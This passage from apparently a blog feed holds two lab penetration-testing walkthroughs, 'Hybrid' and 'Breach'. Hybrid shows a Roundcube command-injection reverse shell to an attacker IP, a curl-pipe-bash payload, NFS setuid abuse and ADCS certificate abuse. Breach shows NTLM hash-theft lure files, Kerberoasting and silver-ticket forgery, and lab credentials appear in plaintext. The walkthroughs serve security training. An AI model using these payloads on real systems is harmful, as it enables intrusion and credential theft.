1,2,3      58479/tcp   mountd</span><br><span class="line">|   100021  1,3,4      39665/tcp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      42639/udp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      43503/tcp   nlockmgr</span><br><span class="line">|   100021  1,3,4      53303/udp   nlockmgr</span><br><span class="line">|   100024  1          37589/tcp   status</span><br><span class="line">|   100024  1          45525/tcp6  status</span><br><span class="line">|   100024  1          51675/udp   status</span><br><span class="line">|   100024  1          52103/udp6  status</span><br><span class="line">|   100227  3           2049/tcp   nfs_acl</span><br><span class="line">|_  100227  3           2049/tcp6  nfs_acl</span><br><span class="line">143/tcp   open  imap     syn-ack ttl 63 Dovecot imapd (Ubuntu)</span><br><span class="line">587/tcp   open  smtp     syn-ack ttl 63 Postfix smtpd</span><br><span class="line">|_smtp-commands: mail01.hybrid.vl, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING</span><br><span class="line">993/tcp   open  ssl/imap syn-ack ttl 63 Dovecot imapd (Ubuntu)</span><br><span class="line">995/tcp   open  ssl/pop3 syn-ack ttl 63 Dovecot pop3d</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">|_pop3-capabilities: UIDL CAPA PIPELINING USER TOP RESP-CODES SASL(PLAIN LOGIN) </span><br><span class="line">2049/tcp  open  nfs_acl  syn-ack ttl 63 3 (RPC #100227)</span><br><span class="line">37589/tcp open  status   syn-ack ttl 63 1 (RPC #100024)</span><br><span class="line">43503/tcp open  nlockmgr syn-ack ttl 63 1-4 (RPC #100021)</span><br><span class="line">43935/tcp open  mountd   syn-ack ttl 63 1-3 (RPC #100005)</span><br><span class="line">50923/tcp open  mountd   syn-ack ttl 63 1-3 (RPC #100005)</span><br><span class="line">58479/tcp open  mountd   syn-ack ttl 63 1-3 (RPC #100005)</span><br></pre></td></tr></table></figure><p>Machine: Ubuntu<br>Initial Observations:</p><ol><li>SMTP: Potential for username enumeration (two ports available)</li><li>HTTP: Possible exploit avenue</li><li>SSH: Potential credential discovery</li><li>Recommendation: Perform full port scan</li></ol><h2 id="SMTP-Exploration"><a href="#SMTP-Exploration" class="headerlink" title="SMTP Exploration"></a>SMTP Exploration</h2><p>Initially attempted to exploit a CVE for SMTP RCE, but was unsuccessful.</p><p><img src="/images/Hybrid/mail.png" alt="SMTP"></p><p>After directory searching, discovered:</p><ul><li>Port 80 runs Roundcube Webmail Release 1.6.1</li><li>No major known vulnerabilities initially apparent</li></ul><h3 id="Roundcube-Webmail-Analysis"><a href="#Roundcube-Webmail-Analysis" class="headerlink" title="Roundcube Webmail Analysis"></a>Roundcube Webmail Analysis</h3><p>Examined <code>composer.json</code> for version and dependency details.<br>References:</p><ul><li><a href="https://www.rapid7.com/db/vulnerabilities/debian-cve-2024-42009/">Rapid7 Vulnerability Database</a></li></ul><h2 id="NFS-Exploration"><a href="#NFS-Exploration" class="headerlink" title="NFS Exploration"></a>NFS Exploration</h2><p>Mount NFS Share:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mount -t nfs -o vers=3 10.10.176.38:/opt/share /mnt/tmpmnt -o nolock</span><br></pre></td></tr></table></figure><p>Found <code>backup.tar.gz</code>, extracted contents:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -xvzf backup.tar.gz</span><br></pre></td></tr></table></figure><p>Extracted Files:</p><ul><li><code>/etc/passwd</code></li><li><code>/etc/sssd/sssd.conf</code></li><li><code>/etc/dovecot/dovecot-users</code></li><li><code>/etc/postfix/main.cf</code></li><li><code>/opt/certs/hybrid.vl/fullchain.pem</code></li><li><code>/opt/certs/hybrid.vl/privkey.pem</code></li></ul><h3 id="Credential-Discovery"><a href="#Credential-Discovery" class="headerlink" title="Credential Discovery"></a>Credential Discovery</h3><p>In <code>/mnt/etc/dovecot/dovecot-users</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin@hybrid.vl:&#123;plain&#125;Duckling21</span><br><span class="line">peter.turner@hybrid.vl:&#123;plain&#125;PeterIstToll!</span><br></pre></td></tr></table></figure><p><img src="/images/Hybrid/peter_email.png" alt="Peter&#39;s Email"></p><h2 id="Exploitation-Strategy"><a href="#Exploitation-Strategy" class="headerlink" title="Exploitation Strategy"></a>Exploitation Strategy</h2><p>Identified Vulnerability:</p><ul><li>Roundcube version 1.6.1 and prior (with markasjunk plugin enabled)</li><li><a href="https://ssd-disclosure.com/ssd-advisory-roundcube-markasjunk-rce/">SSD Advisory - Roundcube RCE</a></li></ul><p>Exploitation Techniques:</p><ol><li>Base64 Encoded Payload:</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8xMC44LjUuMTk1LzQ0NDQgMD4mMQ==</span><br></pre></td></tr></table></figure><ol start="2"><li>Url Encode it:</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">L2Jpbi9zaCAtaSA%2BJiAvZGV2L3RjcC8xMC44LjUuMTk1LzQ0NDQgMD4mMQ%3D%3D</span><br></pre></td></tr></table></figure><ol start="3"><li>Put it all together and send it threw burp:</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin%26echo$&#123;IFS&#125;L2Jpbi9zaCAtaSA%2BJiAvZGV2L3RjcC8xMC44LjUuMTk1LzQ0NDQgMD4mMQ%3D%3D|base64$&#123;IFS&#125;-d|bash%26%40hybrid.vl</span><br></pre></td></tr></table></figure><p><img src="/images/Hybrid/shell.png" alt="Shell Exploitation"></p><ol start="2"><li>Alternate Payload Method:</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">peter.turner&amp;curl$&#123;IFS&#125;10.8.5.195/shell.sh$&#123;IFS&#125;|$&#123;IFS&#125;bash&amp;@hybrid.vl</span><br></pre></td></tr></table></figure><p>After creating the identity we send a email the ourselves (using the identity we created) and we click the Junk button for the payload to trigger</p><h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><p>Database Credentials after running linpeas:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$config[&#x27;db_dsnw&#x27;] = &#x27;mysql://roundcube:Duckling21@localhost/roundcubemail&#x27;;</span><br></pre></td></tr></table></figure><p>MySQL Access:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u roundcube -p roundcubemail</span><br></pre></td></tr></table></figure><p><img src="/images/Hybrid/priv_esc.png" alt="Privilege Escalation"><br>We didnt find anything noteworthy on the database.</p><h4 id="Advanced-NFS-User-Context-Exploitation"><a href="#Advanced-NFS-User-Context-Exploitation" class="headerlink" title="Advanced NFS User Context Exploitation"></a>Advanced NFS User Context Exploitation</h4><p>This exploit leverages a sophisticated technique involving User ID (UID) manipulation and NFS (Network File System) permissions. By carefully crafting a series of steps, we can potentially gain access to a user’s context without direct credential compromise.</p><h5 id="Initial-User-Reconnaissance"><a href="#Initial-User-Reconnaissance" class="headerlink" title="Initial User Reconnaissance"></a>Initial User Reconnaissance</h5><p>When examining the target user’s identification details, we observe a critical piece of information:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@mail01:~/roundcube$ id peter.turner@hybrid.vl</span><br><span class="line">id peter.turner@hybrid.vl</span><br><span class="line">uid=902601108(peter.turner@hybrid.vl) gid=902600513(domain users@hybrid.vl) groups=902600513(domain users@hybrid.vl),902601104(hybridusers@hybrid.vl)</span><br></pre></td></tr></table></figure><h5 id="Exploitation-Methodology"><a href="#Exploitation-Methodology" class="headerlink" title="Exploitation Methodology"></a>Exploitation Methodology</h5><p>The core of this technique revolves around creating a local user with an identical UID and manipulating the bash executable’s permissions through an NFS-mounted share.<br>The attack involves a nuanced approach of running <code>/bin/bash</code> in a context that mimics the target user, without directly compromising their actual credentials. By creating a user with the same UID and strategically modifying the bash binary, we can effectively execute commands in the target user’s context.</p><h5 id="Detailed-Exploitation-Steps"><a href="#Detailed-Exploitation-Steps" class="headerlink" title="Detailed Exploitation Steps"></a>Detailed Exploitation Steps</h5><p>Each step is carefully designed to recreate the target user’s environment and escalate privileges:</p><ul><li>Remote Host: <code>cp /bin/bash /opt/share/</code><ul><li>Copying the <code>/bin/bash</code> executable into the NFS share.</li></ul></li><li>Local Host: <code>sudo useradd peter.turner@hybrid.vl -u 902601108</code><ul><li>Creating a user named <code>peter.turner@hybrid.vl</code> with the same UID as the remote machine.</li><li>NOTE: We will need to edit <code>/etc/login.defs</code> and change <code>UID_MAX</code> to a value greater than <code>902601108</code>.</li></ul></li><li>Local Host: <code>sudo su -l peter.turner@hybrid.vl</code><ul><li>Logging into the new user we created.*</li></ul></li><li>Local Host: <code>sudo mount -t nfs -o vers=3 10.10.231.246:/opt/share /mnt/tmpmnt -o nolock</code><ul><li>Mounting the NFS share to <code>/mnt/tmpmnt</code> once more.</li></ul></li><li>Local Host: <code>cp /mnt/tmpmnt/bash /tmp/tmpbash/</code><ul><li>Copying the <code>bash</code> executable to a temporary directory just so we can reset the privileges of the binary&#x2F;</li></ul></li><li>Remote Host: <code>rm /opt/share/bash</code><ul><li>Removing the <code>bash</code> executable from the remote machine so that we can replace it with a newly configured bash executable.</li></ul></li><li>Local Host: <code>cp /tmp/tmpbash/bash /mnt/tmpmnt/</code><ul><li>Copying our executable back into the NFS share.</li></ul></li><li>Local Host: <code>chmod +s /mnt/tmpmnt/bash</code><ul><li>Configuring the sticky bit of the <code>bash</code> executable. By configuring this privilege, it is essentially saying that any user that runs this binary will run it as the context of that user.</li></ul></li><li>Remote Host: <code>/opt/share/bash -p</code><ul><li>We are running the <code>bash</code> binary with <code>-p</code>, which stands for <code>privileged mode</code>. This essentially means that it will set the effective user ID (EUID) to the real user ID. The binary will run with the permissions of the same user who invoked it based on the user ID. (In this case, <code>peter.turner@hybrid.vl</code>)<br><a href="https://github.com/InfoSecWarrior/Offensive-Pentesting-Enumeration/blob/main/NFS/README.md#escalate-the-privileges-by-nfs">https://github.com/InfoSecWarrior/Offensive-Pentesting-Enumeration/blob/main/NFS/README.md#escalate-the-privileges-by-nfs</a></li></ul></li></ul><h3 id="dc01-hybrid-vl"><a href="#dc01-hybrid-vl" class="headerlink" title="dc01.hybrid.vl"></a>dc01.hybrid.vl</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       REASON          VERSION</span><br><span class="line">53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-03-22 13:05:38Z)</span><br><span class="line">135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory </span><br><span class="line">445/tcp   open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">464/tcp   open  kpasswd5?     syn-ack ttl 127</span><br><span class="line">593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory </span><br><span class="line">3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory </span><br><span class="line">3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span><br><span class="line">| rdp-ntlm-info: </span><br><span class="line">|   Target_Name: HYBRID</span><br><span class="line">|   NetBIOS_Domain_Name: HYBRID</span><br><span class="line">|   NetBIOS_Computer_Name: DC01</span><br><span class="line">|   DNS_Domain_Name: hybrid.vl</span><br><span class="line">|   DNS_Computer_Name: dc01.hybrid.vl</span><br><span class="line">|   Product_Version: 10.0.20348</span><br><span class="line">9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing</span><br><span class="line">49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">50182/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">53771/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">53784/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">53791/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">53807/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">55984/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br></pre></td></tr></table></figure><h2 id="ADCS-Active-Directory-Certificate-Services-Exploitation"><a href="#ADCS-Active-Directory-Certificate-Services-Exploitation" class="headerlink" title="ADCS (Active Directory Certificate Services) Exploitation"></a>ADCS (Active Directory Certificate Services) Exploitation</h2><h3 id="Initial-Reconnaissance-1"><a href="#Initial-Reconnaissance-1" class="headerlink" title="Initial Reconnaissance"></a>Initial Reconnaissance</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy find -u &#x27;peter.turner&#x27;@hybrid.vl -p &#x27;b0cwR+G4Dzl_rw&#x27; -dc-ip 10.10.210.149</span><br></pre></td></tr></table></figure><p><img src="/images/Hybrid/esc1.png" alt="ESC1 Exploitation"></p><h3 id="Machine-Account-Exploitation"><a href="#Machine-Account-Exploitation" class="headerlink" title="Machine Account Exploitation"></a>Machine Account Exploitation</h3><p>Used KeyTabExtract to obtain NTLM hash:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 keytabextraction.py krb5.keytab</span><br></pre></td></tr></table></figure><p>Certificate Request:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req -u &#x27;MAIL01$&#x27;@hybrid.vl -hashes &#x27;&lt;HASH&gt;&#x27; -ca &#x27;hybrid-DC01-CA&#x27; -template HybridComputers -dc-ip 10.10.210.149 -upn &#x27;administrator@hybrid.vl&#x27; -dns dc01.hybrid.vl -key-size 4096 -debug</span><br></pre></td></tr></table></figure><h3 id="Final-Domain-Admin-Acquisition"><a href="#Final-Domain-Admin-Acquisition" class="headerlink" title="Final Domain Admin Acquisition"></a>Final Domain Admin Acquisition</h3><p>Targeted <code>edward.miller</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req -u &#x27;MAIL01$&#x27;@hybrid.vl -hashes &#x27;&lt;HASH&gt;&#x27; -ca &#x27;hybrid-DC01-CA&#x27; -template HybridComputers -dc-ip 10.10.210.149 -upn &#x27;edward.miller@hybrid.vl&#x27; -key-size 5000 -debug</span><br></pre></td></tr></table></figure><p>WinRM Access:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.210.149 -u edward.miller -H &#x27;&lt;HASH&gt;&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/Hybrid/gotdomain.png" alt="Domain Admin Access"></p><p><a href="https://api.vulnlab.com/api/v1/share?id=3699f13c-1071-42b6-a209-7417a77b9d86" title="https:&#x2F;&#x2F;api.vulnlab.com&#x2F;api&#x2F;v1&#x2F;share?id&#x3D;3699f13c-1071-42b6-a209-7417a77b9d86">https://api.vulnlab.com/api/v1/share?id=3699f13c-1071-42b6-a209-7417a77b9d86</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> VulnLab </tag>
            
            <tag> Hack The Box </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VL-Breach</title>
      <link href="/2025/03/18/VL-Breach/"/>
      <url>/2025/03/18/VL-Breach/</url>
      
        <content type="html"><![CDATA[<h1 id="Vulnlab-Hack-The-Box-Breach-Complete-Active-Directory-Compromise-Through-NTLM-Relay-and-Silver-Ticket-Attacks"><a href="#Vulnlab-Hack-The-Box-Breach-Complete-Active-Directory-Compromise-Through-NTLM-Relay-and-Silver-Ticket-Attacks" class="headerlink" title="Vulnlab - Hack The Box Breach: Complete Active Directory Compromise Through NTLM Relay and Silver Ticket Attacks"></a>Vulnlab - Hack The Box Breach: Complete Active Directory Compromise Through NTLM Relay and Silver Ticket Attacks</h1><p>In this comprehensive VulnLab - Hack The Box walkthrough, I’ll demonstrate how to penetrate the “Breach” domain environment by exploiting a series of vulnerabilities leading to complete domain compromise. Starting with anonymous SMB access and NTLM hash capture through social engineering, we’ll progress through Kerberoasting attacks against service accounts, silver ticket generation for privilege escalation, and ultimately achieve SYSTEM-level access via MSSQL exploitation and token impersonation. This penetration test showcases several real-world Active Directory attack vectors including guest account enumeration, NTLM theft techniques, Kerberos service account exploitation, silver ticket forgery, and leveraging impersonation privileges for escalation. The techniques demonstrated highlight common security misconfigurations in Windows environments that penetration testers should look for during enterprise assessments.</p><h2 id="Initial-Enumeration"><a href="#Initial-Enumeration" class="headerlink" title="Initial Enumeration"></a>Initial Enumeration</h2><h3 id="NMAP-Scan-Results"><a href="#NMAP-Scan-Results" class="headerlink" title="NMAP Scan Results"></a>NMAP Scan Results</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE       REASON          VERSION</span><br><span class="line">53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus</span><br><span class="line">80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0</span><br><span class="line">88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-03-17 15:22:18Z)</span><br><span class="line">135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">464/tcp  open  kpasswd5?     syn-ack ttl 127</span><br><span class="line">593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">1433/tcp open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM</span><br><span class="line">| ms-sql-ntlm-info: </span><br><span class="line">|   10.10.109.252:1433: </span><br><span class="line">|     Target_Name: BREACH</span><br><span class="line">|     NetBIOS_Domain_Name: BREACH</span><br><span class="line">|     NetBIOS_Computer_Name: BREACHDC</span><br><span class="line">|     DNS_Domain_Name: breach.vl</span><br><span class="line">|     DNS_Computer_Name: BREACHDC.breach.vl</span><br><span class="line">|     DNS_Tree_Name: breach.vl</span><br><span class="line">|_    Product_Version: 10.0.20348</span><br><span class="line">3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span><br><span class="line">5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2025-03-17T15:22:26</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">|_clock-skew: mean: -1h59m59s, deviation: 0s, median: -1h59m59s</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br></pre></td></tr></table></figure><h2 id="User-Access"><a href="#User-Access" class="headerlink" title="User Access"></a>User Access</h2><h3 id="Enumerating-Shares"><a href="#Enumerating-Shares" class="headerlink" title="Enumerating Shares"></a>Enumerating Shares</h3><p>First, let’s check for available SMB shares using the guest account:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.109.252 -u &#x27;guest&#x27; -p &#x27;&#x27; --shares</span><br></pre></td></tr></table></figure><p><img src="/images/Breach/shares.png" alt="Available SMB Shares"><br>Next, let’s connect to the “share” using the guest account:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.109.252/share -U &#x27;guest&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/Breach/pot-users.png" alt="Potential Users"><br>We found several potential users:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">claire.pope</span><br><span class="line">diana.pope</span><br><span class="line">julia.wong</span><br></pre></td></tr></table></figure><h3 id="NTLM-Hash-Capture"><a href="#NTLM-Hash-Capture" class="headerlink" title="NTLM Hash Capture"></a>NTLM Hash Capture</h3><p>We used <code>ntlm_theft</code> (<a href="https://github.com/Greenwolf/ntlm_theft">https://github.com/Greenwolf/ntlm_theft</a>) to create files that, when accessed, would send us the NTLM hash of the user who opened them:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ntlm_theft.py -g all -s &lt;your ip&gt; -f invoice</span><br></pre></td></tr></table></figure><p>After creating these files, we connected to the SMB share and uploaded them to all accessible folders:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.126.89/share -U &#x27;guest&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mput *</span><br></pre></td></tr></table></figure><p>Then we started Responder to capture any callbacks:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo responder -I tun0 -dwv</span><br></pre></td></tr></table></figure><p><img src="/images/Breach/julia-wong.png" alt="Julia Wong Hash Capture"><br>We saved the hash and cracked it using hashcat:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat hash55.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><h3 id="Accessing-Julia-Wong’s-Files"><a href="#Accessing-Julia-Wong’s-Files" class="headerlink" title="Accessing Julia Wong’s Files"></a>Accessing Julia Wong’s Files</h3><p>Now that we have Julia Wong’s credentials, we logged back into the share:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.126.89/share -U &#x27;julia.wong&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/Breach/localfile.png" alt="Local User Flag"><br>This is where we found the user flag.</p><h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><h3 id="BloodHound-Enumeration"><a href="#BloodHound-Enumeration" class="headerlink" title="BloodHound Enumeration"></a>BloodHound Enumeration</h3><p>To get a better understanding of the Active Directory environment, we used BloodHound:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap 10.10.126.89 -u &#x27;julia.wong&#x27; -p &#x27;Computer1&#x27;  --bloodhound --dns-server 10.10.126.89 -c All --dns-tcp</span><br></pre></td></tr></table></figure><p>Inside BloodHound, we identified a kerberoastable service named <code>SVC_MSSQL@BREACH.VL</code>. We decided to target this service for our lateral movement.</p><h3 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h3><p>We attempted to obtain the service hash:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-GetUserSPNs -dc-ip 10.10.126.89 -request breach.vl/julia.wong:&#x27;&lt;PASSWORD&gt;&#x27;</span><br></pre></td></tr></table></figure><p>Initially, we encountered a clock skew error: <code>KRB_AP_ERR_SKEW(Clock skew too great)</code>. To fix this, we synchronized our time with the target system:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo timedatectl set-ntp off</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo rdate -n [IP of Target]</span><br></pre></td></tr></table></figure><p>Then we ran GetUserSPNs again:<br><img src="/images/Breach/sql-serv-hash.png" alt="SQL Service Hash"><br>We cracked the hash using hashcat:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat hash56.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p>This gave us the password for the MSSQL service account.</p><h3 id="MSSQL-Access"><a href="#MSSQL-Access" class="headerlink" title="MSSQL Access"></a>MSSQL Access</h3><p>We connected to the MSSQL server using the service account:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-mssqlclient svc_mssql:Trustno1@10.10.126.89</span><br></pre></td></tr></table></figure><p>We attempted to enable command execution but encountered permission issues:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ERROR(BREACHDC\SQLEXPRESS): Line 105: User does not have permission to perform this action.</span><br><span class="line">ERROR(BREACHDC\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.</span><br><span class="line">ERROR(BREACHDC\SQLEXPRESS): Line 62: The configuration option &#x27;xp_cmdshell&#x27; does not exist, or it may be an advanced option.</span><br><span class="line">ERROR(BREACHDC\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.</span><br></pre></td></tr></table></figure><h3 id="Silver-Ticket-Attack"><a href="#Silver-Ticket-Attack" class="headerlink" title="Silver Ticket Attack"></a>Silver Ticket Attack</h3><p>Since we couldn’t execute commands directly, we decided to create a Silver Ticket:</p><ol><li><p>First, we converted the service account password to an NT hash using an online tool: <a href="https://www.browserling.com/tools/ntlm-hash">https://www.browserling.com/tools/ntlm-hash</a></p></li><li><p>Next, we needed the domain SID:</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lookupsid.py &#x27;breach.vl/svc_mssql@10.10.126.89&#x27; 0</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Domain SID is: S-1-5-21-2330692793-3312915120-706255856</span><br></pre></td></tr></table></figure><ol start="3"><li>We created the Silver Ticket using ticketer:</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-ticketer -nthash &lt;&gt; -domain-sid S-1-5-21-2330692793-3312915120-706255856 -domain breach.vl -dc-ip breachdc -spn MSSQLSvc/breachdc.breach.vl:1433 administrator</span><br></pre></td></tr></table></figure><figure class="highlight 